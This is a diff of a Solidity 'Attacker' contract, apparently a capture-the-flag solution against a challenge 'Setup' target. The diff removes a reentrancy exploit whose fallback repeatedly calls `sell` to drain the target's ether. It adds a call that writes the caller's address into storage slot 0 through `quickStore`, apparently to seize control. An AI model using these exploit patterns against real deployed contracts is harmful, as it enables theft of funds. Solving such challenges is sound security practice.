@@ -10,27 +10,17 @@ contract Attacker {
         SETUP = Setup(setup);
     }
 
-    function attack() external payable {
-        require(msg.value >= 1 ether);
+    function attack() public payable {
+        // Ensure enough ETH is sent to cover the required fee (1337 wei)
+        require(msg.value == 1337, "Incorrect eth value sent");
 
-        uint256 targetInitialBalance = address(SETUP.TARGET()).balance;
+        // Encode the function call to quickStore
+        bytes memory data = abi.encodeWithSignature("quickStore(uint8,uint256)", 0, address(msg.sender));
 
-        SETUP.TARGET().buy{value: 1 ether}();
-        SETUP.TARGET().sell(1 ether);
+        // Call the Guardian contract with the encoded data
+        (bool success, ) = address(SETUP.TARGET()).call{value: msg.value}(data);
+        require(success, "Call to Guardian failed");
 
-        uint256 targetFinalBalance = address(SETUP.TARGET()).balance;
-
-        require(targetInitialBalance > targetFinalBalance, "Operation failed");
-        require(targetFinalBalance == 0, "Target still has balance");
-        (bool success,) = (msg.sender).call{value: address(this).balance}("");
-        require(success, "Transfer failed");
-    }
-
-    fallback() external payable {
-        uint256 balance = address(SETUP.TARGET()).balance;
-        uint256 amount = 1 ether <= balance ? 1 ether : balance;
-        if (amount > 0) {
-            SETUP.TARGET().sell(amount);
-        }
+        //SETUP.TARGET().putToSleep();
     }
 }
